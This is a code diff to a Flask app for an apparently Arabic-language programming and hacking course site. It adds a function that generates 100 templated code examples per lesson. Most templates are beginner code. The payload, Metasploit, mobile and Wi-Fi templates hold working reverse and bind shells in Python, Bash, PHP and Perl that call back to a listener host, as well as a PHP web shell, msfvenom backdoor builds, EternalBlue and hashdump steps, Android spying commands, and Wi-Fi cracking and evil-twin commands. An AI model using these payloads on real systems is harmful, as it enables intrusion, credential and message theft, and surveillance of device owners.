@@ -7,139 +7,992 @@ app = Flask(__name__)
 # ===== بيانات الدورس التعليمية =====
 COURSES_DATA = {}
 
+# ===== دالة لتوليد 100 كود تعليمي لكل درس =====
+def generate_100_codes(course_id, base_code):
+    codes = []
+    
+    # تحديد لغة الكود
+    lang = 'python'
+    if 'cpp' in course_id:
+        lang = 'cpp'
+    elif 'js' in course_id:
+        lang = 'javascript'
+    elif 'assembly' in course_id:
+        lang = 'assembly'
+    elif 'bash' in course_id:
+        lang = 'bash'
+    elif 'sqlmap' in course_id or 'exploit' in course_id or 'sql' in course_id:
+        lang = 'sql'
+    elif 'nmap' in course_id or 'scanning' in course_id:
+        lang = 'nmap'
+    elif 'metasploit' in course_id:
+        lang = 'metasploit'
+    elif 'burp' in course_id:
+        lang = 'burp'
+    elif 'wireshark' in course_id or 'network' in course_id:
+        lang = 'wireshark'
+    elif 'payload' in course_id:
+        lang = 'payload'
+    elif 'recon' in course_id:
+        lang = 'recon'
+    elif 'crypto' in course_id:
+        lang = 'crypto'
+    elif 'wifi' in course_id:
+        lang = 'wifi'
+    elif 'mobile' in course_id:
+        lang = 'mobile'
+    
+    # توليد 100 كود مختلف حسب اللغة
+    for i in range(1, 101):
+        if lang == 'python':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح مفهوم مهم في البرمجة
+
+def example_{i}():
+    """
+    شرح المثال رقم {i}
+    هذا المثال يوضح كيفية استخدام الدوال والمتغيرات في Python
+    """
+    print(f"تنفيذ المثال رقم {i}")
+    
+    # متغيرات
+    x = {i}
+    y = {i * 2}
+    z = x + y
+    
+    # قائمة
+    my_list = [1, 2, 3, 4, 5, {i}]
+    
+    # قاموس
+    my_dict = {{
+        'id': {i},
+        'name': f'item_{i}',
+        'value': {i * 10}
+    }}
+    
+    # حلقة
+    for num in range({i % 5 + 1}):
+        print(f"  الرقم: {{num}}")
+    
+    # دالة
+    def calculate(a, b):
+        return a * b + {i}
+    
+    result = calculate({i}, {i+1})
+    
+    # شرط
+    if result > 100:
+        print(f"النتيجة كبيرة: {{result}}")
+    else:
+        print(f"النتيجة صغيرة: {{result}}")
+    
+    # معالجة استثناءات
+    try:
+        value = {i} / max(1, {i % 3})
+    except ZeroDivisionError:
+        print("لا يمكن القسمة على صفر")
+    
+    return result
+
+# تنفيذ الدالة
+if __name__ == "__main__":
+    output = example_{i}()
+    print(f"المخرجات: {{output}}")
+''')
+        
+        elif lang == 'cpp':
+            codes.append(f'''// ===== المثال رقم {i} =====
+// درس: {course_id}
+// هذا المثال يوضح مفهوم مهم في C++
+
+#include <iostream>
+#include <vector>
+#include <map>
+#include <string>
+#include <algorithm>
+using namespace std;
+
+// دالة للمثال رقم {i}
+int example_{i}() {{
+    cout << "تنفيذ المثال رقم {i}" << endl;
+    
+    // متغيرات
+    int x = {i};
+    double y = {i * 2.5};
+    string name = "item_" + to_string({i});
+    
+    // مصفوفة
+    vector<int> numbers;
+    for(int j = 0; j < {i % 10 + 1}; j++) {{
+        numbers.push_back(j * {i});
+    }}
+    
+    // خريطة
+    map<string, int> data;
+    data["id"] = {i};
+    data["value"] = {i * 10};
+    
+    // حلقة
+    for(int num : numbers) {{
+        cout << "  رقم: " << num << endl;
+    }}
+    
+    // شرط
+    if(x > 50) {{
+        cout << "الرقم أكبر من 50" << endl;
+    }} else {{
+        cout << "الرقم أقل أو يساوي 50" << endl;
+    }}
+    
+    // دالة
+    auto calculate = [&](int a, int b) {{
+        return a * b + {i};
+    }};
+    
+    int result = calculate({i}, {i+1});
+    cout << "النتيجة: " << result << endl;
+    
+    return result;
+}}
+
+int main() {{
+    example_{i}();
+    return 0;
+}}
+''')
+        
+        elif lang == 'javascript':
+            codes.append(f'''// ===== المثال رقم {i} =====
+// درس: {course_id}
+// هذا المثال يوضح مفهوم مهم في JavaScript
+
+/**
+ * شرح المثال رقم {i}
+ * هذا المثال يوضح كيفية استخدام الدوال والمتغيرات في JavaScript
+ */
+function example_{i}() {{
+    console.log(`تنفيذ المثال رقم {i}`);
+    
+    // متغيرات
+    let x = {i};
+    const y = {i * 2};
+    var name = `item_${{i}}`;
+    
+    // مصفوفة
+    const numbers = Array.from({{length: {i % 10 + 1}}}, (_, idx) => idx * {i});
+    
+    // كائن
+    const data = {{
+        id: {i},
+        name: `item_${{i}}`,
+        value: {i * 10}
+    }};
+    
+    // حلقة
+    numbers.forEach(num => {{
+        console.log(`  رقم: ${{num}}`);
+    }});
+    
+    // دالة
+    const calculate = (a, b) => {{
+        return a * b + {i};
+    }};
+    
+    const result = calculate({i}, {i+1});
+    
+    // شرط
+    if (result > 100) {{
+        console.log(`النتيجة كبيرة: ${{result}}`);
+    }} else {{
+        console.log(`النتيجة صغيرة: ${{result}}`);
+    }}
+    
+    // Promise
+    const promise = new Promise((resolve) => {{
+        setTimeout(() => resolve(`تم تنفيذ {i}`), 1000);
+    }});
+    
+    promise.then(msg => console.log(msg));
+    
+    return result;
+}}
+
+// تنفيذ الدالة
+example_{i}();
+''')
+        
+        elif lang == 'bash':
+            codes.append(f'''#!/bin/bash
+# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح مفهوم مهم في Bash
+
+echo "تنفيذ المثال رقم {i}"
+
+# متغيرات
+x={i}
+y=$(({i} * 2))
+name="item_${{i}}"
+
+# مصفوفة
+numbers=()
+for ((j=0; j<{i % 10 + 1}; j++)); do
+    numbers+=($((j * {i})))
+done
+
+# حلقة
+for num in "${{numbers[@]}}"; do
+    echo "  رقم: $num"
+done
+
+# شرط
+if [ $x -gt 50 ]; then
+    echo "الرقم أكبر من 50"
+else
+    echo "الرقم أقل أو يساوي 50"
+fi
+
+# دالة
+calculate() {{
+    local a=$1
+    local b=$2
+    echo $((a * b + {i}))
+}}
+
+result=$(calculate {i} $(({i}+1)))
+echo "النتيجة: $result"
+
+# ملف
+echo "محتوى الملف" > output_{i}.txt
+echo "تم إنشاء output_{i}.txt"
+''')
+        
+        elif lang == 'assembly':
+            codes.append(f'''; ===== المثال رقم {i} =====
+; درس: {course_id}
+; هذا المثال يوضح مفهوم مهم في Assembly
+
+section .data
+    msg_{i} db 'تنفيذ المثال رقم {i}', 0
+    newline db 10, 0
+    num_{i} dw {i}
+    num2_{i} dw {i * 2}
+    result_{i} dw 0
+
+section .bss
+    buffer_{i} resb 100
+
+section .text
+    global _start
+
+_start:
+    ; طباعة الرسالة
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, msg_{i}
+    mov edx, 30
+    int 0x80
+
+    ; إجراء عملية حسابية
+    mov ax, [num_{i}]
+    add ax, [num2_{i}]
+    mov [result_{i}], ax
+
+    ; طباعة النتيجة
+    mov eax, [result_{i}]
+    add eax, 48
+    mov [buffer_{i}], eax
+
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, buffer_{i}
+    mov edx, 1
+    int 0x80
+
+    ; إنهاء البرنامج
+    mov eax, 1
+    xor ebx, ebx
+    int 0x80
+''')
+        
+        elif lang in ['sql', 'sqlmap']:
+            codes.append(f'''-- ===== المثال رقم {i} =====
+-- درس: {course_id}
+-- هذا المثال يوضح مفهوم مهم في SQL
+
+-- إنشاء جدول
+CREATE TABLE IF NOT EXISTS users_{i} (
+    id INTEGER PRIMARY KEY,
+    username TEXT NOT NULL,
+    password TEXT NOT NULL,
+    email TEXT,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+    status INTEGER DEFAULT 1
+);
+
+-- إدخال بيانات
+INSERT INTO users_{i} (username, password, email)
+VALUES 
+    ('admin_{i}', 'pass123_{i}', 'admin_{i}@example.com'),
+    ('user1_{i}', 'userpass_{i}', 'user1_{i}@example.com'),
+    ('test_{i}', 'testpass_{i}', 'test_{i}@example.com');
+
+-- استعلام أساسي
+SELECT * FROM users_{i} WHERE id = {i % 5 + 1};
+
+-- استعلام مع شرط
+SELECT username, email FROM users_{i} WHERE status = 1;
+
+-- استعلام مع ترتيب
+SELECT * FROM users_{i} ORDER BY created_at DESC;
+
+-- تحديث بيانات
+UPDATE users_{i} SET status = 0 WHERE id = {i % 3 + 1};
+
+-- حذف بيانات
+DELETE FROM users_{i} WHERE id = {i % 2 + 1};
+
+-- استعلام متقدم مع JOIN
+SELECT u.username, u.email 
+FROM users_{i} u
+WHERE u.id IN (SELECT id FROM users_{i} WHERE status = 1);
+
+-- إحصاءات
+SELECT COUNT(*) as total_users FROM users_{i};
+SELECT status, COUNT(*) as count FROM users_{i} GROUP BY status;
+''')
+        
+        elif lang == 'nmap':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح استخدام Nmap
+
+# مسح سريع
+nmap -T4 -F 192.168.1.0/24
+
+# مسح مفصل للمنافذ
+nmap -p- 192.168.1.100
+
+# اكتشاف الخدمات والإصدارات
+nmap -sV --version-intensity {i % 9 + 1} 192.168.1.100
+
+# اكتشاف نظام التشغيل
+nmap -O 192.168.1.100
+
+# مسح UDP
+nmap -sU 192.168.1.100
+
+# استخدام NSE Scripts
+nmap --script vuln 192.168.1.100
+nmap --script http-enum 192.168.1.100
+nmap --script smb-enum-shares 192.168.1.100
+
+# مسح مع تجاوز الجدار الناري
+nmap -f -D RND:10 192.168.1.100
+
+# مسح Subnet
+nmap -sP 192.168.1.0/24
+
+# مسح منافذ محددة
+nmap -p 80,443,8080,{i} 192.168.1.100
+
+# مسح مع إخراج بتنسيق XML
+nmap -oX scan_{i}.xml 192.168.1.100
+''')
+        
+        elif lang == 'metasploit':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح استخدام Metasploit
+
+# تشغيل Metasploit
+msfconsole
+
+# استخدام وحدة استغلال
+use exploit/windows/smb/ms17_010_eternalblue
+
+# تعيين الأهداف
+set RHOSTS 192.168.1.100
+set RPORT 445
+
+# تعيين الحمولة
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+set LPORT 4444
+
+# تشغيل الاستغلال
+exploit
+
+# إذا نجح الاستغلال
+# بعد الحصول على جلسة Meterpreter
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > shell
+
+# أوامر إضافية
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.1.0/24
+run
+
+# استخدام وحدة أخرى
+use post/windows/gather/hashdump
+set SESSION {i % 5 + 1}
+run
+
+# حفظ الجلسات
+sessions -l
+sessions -i {i % 5 + 1}
+
+# حمولة مخصصة
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
+''')
+        
+        elif lang == 'burp':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح استخدام Burp Suite
+
+# إعداد الـ Proxy
+# المتصفح -> Burp (127.0.0.1:8080)
+
+# التقاط الطلبات
+# 1. فتح Burp Suite
+# 2. الذهاب إلى Proxy -> Intercept
+# 3. تشغيل Intercept
+# 4. تصفح الموقع المستهدف
+# 5. تعديل الطلب
+
+# استخدام Repeater
+# 1. إرسال طلب إلى Repeater
+# 2. تعديل المعاملات
+# 3. إعادة الإرسال وعرض الرد
+
+# استخدام Intruder
+# 1. تحديد موضع الهجوم
+# 2. اختيار نوع الهجوم (Sniper, Battering Ram, Pitchfork, Cluster Bomb)
+# 3. تحميل قائمة الكلمات
+# 4. بدء الهجوم
+
+# استغلال SQL Injection عبر Burp
+# تعديل معاملات GET/POST
+# إضافة: ' OR '1'='1
+# إضافة: ' UNION SELECT NULL--
+
+# استغلال XSS عبر Burp
+# إضافة: <script>alert('XSS_{i}')</script>
+# إضافة: <img src=x onerror=alert('XSS')>
+
+# استخدام Scanner
+# 1. الذهاب إلى Scanner
+# 2. إضافة هدف
+# 3. بدء المسح التلقائي
+
+# استخدام Extensions (BApp Store)
+# تثبيت إضافات مفيدة
+''')
+        
+        elif lang == 'wireshark':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح استخدام Wireshark
+
+# تشغيل Wireshark
+wireshark
+
+# البدء في الالتقاط
+# 1. اختيار الواجهة (eth0, wlan0, etc.)
+# 2. الضغط على Start
+
+# تصفية الحزم
+# HTTP: http
+# HTTPS: tcp.port == 443
+# DNS: dns
+# ARP: arp
+# ICMP: icmp
+# TCP: tcp
+# UDP: udp
+# IP: ip.addr == 192.168.1.100
+# منفذ: tcp.port == 80
+
+# تتبع الـ Streams
+# 1. النقر بزر الماوس الأيمن على حزمة
+# 2. Follow -> TCP Stream
+
+# تصدير البيانات
+# File -> Export Objects -> HTTP
+
+# استخدام Captures
+# التقاط حزم HTTP
+tcpdump -i eth0 -w capture_{i}.pcap
+
+# تحليل الملف
+wireshark capture_{i}.pcap
+
+# تصفية متقدمة
+# (http.request.uri contains "admin") or (http.request.uri contains "login")
+# tcp.flags.syn == 1 and tcp.flags.ack == 0
+
+# إحصائيات
+# Statistics -> Protocol Hierarchy
+# Statistics -> Endpoints
+''')
+        
+        elif lang == 'payload':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح الحمولات المختلفة
+
+# Reverse Shell في Python
+import socket, subprocess, os
+
+def reverse_shell_{i}():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.1.50', 4444))
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        subprocess.call(['/bin/sh', '-i'])
+    except:
+        pass
+
+# Reverse Shell في Bash
+# bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
+
+# Reverse Shell في PHP
+# <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"); ?>
+
+# Reverse Shell في Perl
+# perl -e 'use Socket;$i="192.168.1.50";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
+
+# Web Shell
+# <?php system($_GET['cmd_{i}']); ?>
+# استخدام: shell.php?cmd_{i}=ls -la
+
+# Bind Shell في Python
+import socket, subprocess
+
+def bind_shell_{i}():
+    s = socket.socket()
+    s.bind(('0.0.0.0', 4444))
+    s.listen(5)
+    while True:
+        client, addr = s.accept()
+        while True:
+            cmd = client.recv(1024).decode()
+            output = subprocess.getoutput(cmd)
+            client.send(output.encode())
+
+# حمولة لـ Meterpreter
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
+
+# حمولة لـ Android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
+
+# حمولة لـ Linux
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload_{i}.elf
+''')
+        
+        elif lang == 'recon':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح جمع المعلومات
+
+# Whois
+whois example.com
+
+# NSLookup
+nslookup example.com
+dig example.com
+
+# جمع المعلومات باستخدام Python
+import socket
+import requests
+import whois
+
+def recon_{i}(domain):
+    print(f"[+] جمع المعلومات عن: {{domain}}")
+    
+    # Whois
+    try:
+        w = whois.whois(domain)
+        print(f"  Registrar: {{w.registrar}}")
+        print(f"  Creation Date: {{w.creation_date}}")
+        print(f"  Expiration Date: {{w.expiration_date}}")
+    except:
+        pass
+    
+    # IP
+    try:
+        ip = socket.gethostbyname(domain)
+        print(f"  IP Address: {{ip}}")
+    except:
+        pass
+    
+    # Headers
+    try:
+        headers = requests.head(f"http://{{domain}}").headers
+        print(f"  Server: {{headers.get('Server', 'Unknown')}}")
+    except:
+        pass
+    
+    # Subdomains
+    subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api']
+    for sub in subdomains:
+        try:
+            subdomain = f"{{sub}}.{{domain}}"
+            socket.gethostbyname(subdomain)
+            print(f"  Found: {{subdomain}}")
+        except:
+            pass
+    
+    return f"Recon {i} completed"
+
+# تنفيذ
+recon_{i}("example.com")
+
+# Google Dorks
+# site:example.com filetype:pdf
+# intitle:"index of" password
+# inurl:admin login.php
+# filetype:sql "INSERT INTO" -"phpMyAdmin"
+
+# Shodan
+# shodan search 'apache' --limit 10
+# shodan host 1.1.1.1
+
+# theHarvester
+# theHarvester -d example.com -b google -l 100
+''')
+        
+        elif lang == 'crypto':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح التشفير وفك التشفير
+
+import hashlib
+import base64
+from cryptography.fernet import Fernet
+import os
+
+def crypto_{i}():
+    print(f"[+] مثال التشفير رقم {i}")
+    
+    # 1. تشفير Base64
+    text = f"message_{i}"
+    encoded = base64.b64encode(text.encode()).decode()
+    decoded = base64.b64decode(encoded).decode()
+    print(f"  Base64: {{encoded}}")
+    print(f"  فك: {{decoded}}")
+    
+    # 2. Hash (SHA-256)
+    hash_obj = hashlib.sha256(text.encode())
+    hash_hex = hash_obj.hexdigest()
+    print(f"  SHA-256: {{hash_hex[:32]}}...")
+    
+    # 3. Hash (MD5)
+    md5_obj = hashlib.md5(text.encode())
+    print(f"  MD5: {{md5_obj.hexdigest()}}")
+    
+    # 4. تشفير متماثل (Fernet)
+    key = Fernet.generate_key()
+    cipher = Fernet(key)
+    encrypted = cipher.encrypt(text.encode())
+    decrypted = cipher.decrypt(encrypted).decode()
+    print(f"  مشفر (Fernet): {{encrypted[:50]}}...")
+    print(f"  مفكوك (Fernet): {{decrypted}}")
+    
+    # 5. OpenSSL Commands
+    # تشفير: openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
+    # فك: openssl enc -d -aes-256-cbc -in file.enc -out file.txt
+    
+    # 6. RSA Keys
+    # توليد مفتاح: openssl genrsa -out private.key 2048
+    # استخراج عام: openssl rsa -in private.key -pubout -out public.key
+    
+    # 7. Password Hashing
+    # python -c "import crypt; print(crypt.crypt('password', crypt.mksalt(crypt.METHOD_SHA512)))"
+    
+    # 8. Hashcat
+    # hashcat -m 0 -a 0 hash.txt rockyou.txt
+    # hashcat -m 1000 -a 0 hash.txt rockyou.txt (NTLM)
+    # hashcat -m 1800 -a 0 hash.txt rockyou.txt (SHA-512)
+    
+    return "تم التشفير بنجاح"
+
+# تنفيذ
+crypto_{i}()
+''')
+        
+        elif lang == 'wifi':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح اختراق Wi-Fi
+
+# 1. وضع الواجهة في وضع المراقبة
+sudo airmon-ng start wlan0
+
+# 2. مسح الشبكات
+sudo airodump-ng wlan0mon
+
+# 3. مسح شبكة محددة
+sudo airodump-ng -c CHANNEL --bssid MAC wlan0mon
+
+# 4. التقاط المصافحة
+sudo airodump-ng -c CHANNEL --bssid MAC -w capture_{i} wlan0mon
+
+# 5. هجوم إلغاء المصادقة
+sudo aireplay-ng -0 5 -a MAC wlan0mon
+
+# 6. كسر كلمة المرور
+sudo aircrack-ng -w wordlist.txt capture_{i}.cap
+
+# 7. استخدام Hashcat
+# تحويل الملف إلى تنسيق 22000
+hcxpcapngtool -o hash_{i}.22000 capture_{i}.cap
+# كسر الهاش
+hashcat -m 22000 hash_{i}.22000 rockyou.txt
+
+# 8. PMKID Attack
+# sudo hcxdumptool -i wlan0mon -o dump_{i}.pcapng --enable_status=1
+# sudo hcxpcaptool -z hash_{i}.16800 dump_{i}.pcapng
+# hashcat -m 16800 hash_{i}.16800 rockyou.txt
+
+# 9. WPS Attack
+sudo wash -i wlan0mon
+sudo reaver -i wlan0mon -b MAC -c CHANNEL -vv
+
+# 10. Evil Twin Attack
+# sudo airbase-ng -a MAC -e "FreeWiFi" wlan0mon
+# sudo dhcpd -cf /etc/dhcp/dhcpd.conf wlan0
+# sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080
+''')
+        
+        elif lang == 'mobile':
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا المثال يوضح اختراق الأجهزة المحمولة
+
+# 1. إنشاء حمولة لـ Android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
+
+# 2. توقيع التطبيق
+# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore payload_{i}.apk alias_name
+# zipalign -v 4 payload_{i}.apk payload_{i}_signed.apk
+
+# 3. تشغيل Metasploit
+# msfconsole
+# use exploit/multi/handler
+# set PAYLOAD android/meterpreter/reverse_tcp
+# set LHOST 192.168.1.50
+# set LPORT 4444
+# exploit
+
+# 4. بعد الحصول على جلسة
+# meterpreter > sysinfo
+# meterpreter > webcam_snap
+# meterpreter > dump_contacts
+# meterpreter > dump_sms
+# meterpreter > geolocate
+
+# 5. اختراق iOS (jailbreak)
+# استخدام Cydia
+# تثبيت ssh
+# ssh root@IP
+
+# 6. ADB Commands
+adb devices
+adb shell
+adb install payload_{i}.apk
+
+# 7. اختراق Android عبر Backdoor
+# استخدام تطبيقات ضارة
+# استخدام خدمات Accessibility
+
+# 8. جمع المعلومات
+# /data/data/com.example/databases/
+# /data/data/com.example/shared_prefs/
+# /sdcard/Android/data/
+''')
+        
+        else:
+            # كود عام
+            codes.append(f'''# ===== المثال رقم {i} =====
+# درس: {course_id}
+# هذا مثال تعليمي عام
+
+print(f"المثال رقم {i}")
+
+# متغيرات
+x = {i}
+y = {i * 2}
+z = x + y
+
+print(f"x = {{x}}, y = {{y}}, z = {{z}}")
+
+# قائمة
+numbers = [n * {i} for n in range(10)]
+print(f"الأرقام: {{numbers[:5]}}...")
+
+# قاموس
+data = {{
+    'id': {i},
+    'name': f'item_{i}',
+    'value': {i * 10}
+}}
+print(f"البيانات: {{data}}")
+
+# حلقة
+for n in range({i % 5 + 1}):
+    print(f"  n = {{n}}")
+
+# دالة
+def example_func(x):
+    return x * 2 + {i}
+
+result = example_func({i})
+print(f"النتيجة: {{result}}")
+''')
+    
+    return codes
+
 # ===== 1. البرمجة (30 درس) =====
 programming_courses = [
-    {"id": "python1", "name": "Python - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة", "code": "print('Hello, World!')\n\nname = 'عبود'\nage = 25\nprint(f'الاسم: {name}, العمر: {age}')"},
-    {"id": "python2", "name": "Python - المتغيرات والأنواع", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "x = 10\ny = 3.14\nname = 'Python'\nis_true = True\nprint(type(x), type(y), type(name), type(is_true))"},
-    {"id": "python3", "name": "Python - الحلقات والتكرار", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة", "code": "for i in range(5):\n    print(f'رقم: {i}')\n\nwhile x > 0:\n    print(x)\n    x -= 1"},
-    {"id": "python4", "name": "Python - الدوال والبرمجة الوظيفية", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "def greet(name):\n    return f'مرحباً {name}'\n\nresult = map(greet, ['عبود', 'سارة', 'أحمد'])"},
-    {"id": "python5", "name": "Python - البرمجة الكائنية OOP", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة", "code": "class Student:\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def display(self):\n        print(f'الاسم: {self.name}, العمر: {self.age}')"},
-    {"id": "python6", "name": "Python - المصفوفات والقوائم", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "my_list = [1, 2, 3, 4, 5]\nmy_list.append(6)\nprint(my_list[0], my_list[-1])"},
-    {"id": "python7", "name": "Python - القواميس والمجموعات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "student = {'name': 'عبود', 'age': 25}\nstudent['grade'] = 'A'\nprint(student.keys(), student.values())"},
-    {"id": "python8", "name": "Python - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "with open('file.txt', 'r') as f:\n    content = f.read()\n    print(content)"},
-    {"id": "python9", "name": "Python - المكتبات الشائعة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "import requests, json, os, sys, re, datetime\nprint(requests.get('https://api.github.com').status_code)"},
-    {"id": "python10", "name": "Python - التعامل مع قواعد البيانات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة", "code": "import sqlite3\nconn = sqlite3.connect('database.db')\ncursor = conn.cursor()\ncursor.execute('SELECT * FROM users')"},
-    {"id": "cpp1", "name": "C++ - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة", "code": "#include <iostream>\nusing namespace std;\nint main() { cout << 'Hello, World!'; return 0; }"},
-    {"id": "cpp2", "name": "C++ - المتغيرات والعمليات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "int x = 10;\ndouble y = 3.14;\nchar c = 'A';\ncout << x + y << endl;"},
-    {"id": "cpp3", "name": "C++ - الحلقات والشرط", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة", "code": "for(int i=0; i<10; i++) {\n    if(i%2==0) cout << i << ' ';\n}"},
-    {"id": "cpp4", "name": "C++ - الدوال والبرمجة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "void greet(string name) {\n    cout << 'Hello, ' << name << endl;\n}"},
-    {"id": "cpp5", "name": "C++ - البرمجة الكائنية", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة", "code": "class Car {\npublic:\n    string brand;\n    void start() { cout << 'Engine started'; }\n};"},
-    {"id": "cpp6", "name": "C++ - المؤشرات والذاكرة", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة", "code": "int* ptr = new int(10);\ncout << *ptr;\ndelete ptr;"},
-    {"id": "cpp7", "name": "C++ - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "ifstream file('data.txt');\nstring line;\nwhile(getline(file, line)) { cout << line; }"},
-    {"id": "cpp8", "name": "C++ - STL والحاويات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة", "code": "vector<int> v = {1,2,3,4,5};\nmap<string,int> m = {{'a',1}, {'b',2}};"},
-    {"id": "js1", "name": "JavaScript - أساسيات", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة", "code": "let name = 'عبود';\nconst age = 25;\nconsole.log(`الاسم: ${name}`);"},
-    {"id": "js2", "name": "JavaScript - الدوال والسهمية", "level": "متوسط", "duration": "2 ساعات", "category": "البرمجة", "code": "const greet = (name) => {\n    return `مرحباً ${name}`;\n};"},
-    {"id": "js3", "name": "JavaScript - DOM والتعامل مع الصفحة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "document.getElementById('btn').addEventListener('click', () => {\n    alert('تم الضغط');\n});"},
-    {"id": "js4", "name": "JavaScript - Ajax و Fetch", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة", "code": "fetch('https://api.example.com/data')\n.then(response => response.json())\n.then(data => console.log(data));"},
-    {"id": "js5", "name": "JavaScript - Promises و Async", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "async function getData() {\n    const data = await fetch('api');\n    return data.json();\n}"},
-    {"id": "js6", "name": "JavaScript - OOP في JavaScript", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "class Student {\n    constructor(name) { this.name = name; }\n    display() { console.log(this.name); }\n}"},
-    {"id": "assembly1", "name": "Assembly - مقدمة", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "section .data\nmsg db 'Hello, World!',0\nsection .text\nmov eax, 4\nmov ebx, 1\nmov ecx, msg\nint 0x80"},
-    {"id": "assembly2", "name": "Assembly - العمليات الحسابية", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "mov eax, 10\nadd eax, 20\nsub eax, 5\nmul 2"},
-    {"id": "bash1", "name": "Bash - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة", "code": "#!/bin/bash\necho 'Hello, World!'\nname='عبود'\necho $name"},
-    {"id": "bash2", "name": "Bash - الحلقات والشروط", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "for i in {1..5}; do\n    if [ $i -gt 3 ]; then echo $i; fi\ndone"},
-    {"id": "bash3", "name": "Bash - إدارة الملفات والأنظمة", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة", "code": "mkdir new_dir\ncp file.txt new_dir/\nls -la | grep '.txt'"},
-    {"id": "bash4", "name": "Bash - الأتمتة والـ Cron Jobs", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة", "code": "#!/bin/bash\n# سكربت تشغيل تلقائي\n0 * * * * /home/user/backup.sh"},
+    {"id": "python1", "name": "Python - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "python2", "name": "Python - المتغيرات والأنواع", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
+    {"id": "python3", "name": "Python - الحلقات والتكرار", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة"},
+    {"id": "python4", "name": "Python - الدوال والبرمجة الوظيفية", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
+    {"id": "python5", "name": "Python - البرمجة الكائنية OOP", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة"},
+    {"id": "python6", "name": "Python - المصفوفات والقوائم", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
+    {"id": "python7", "name": "Python - القواميس والمجموعات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
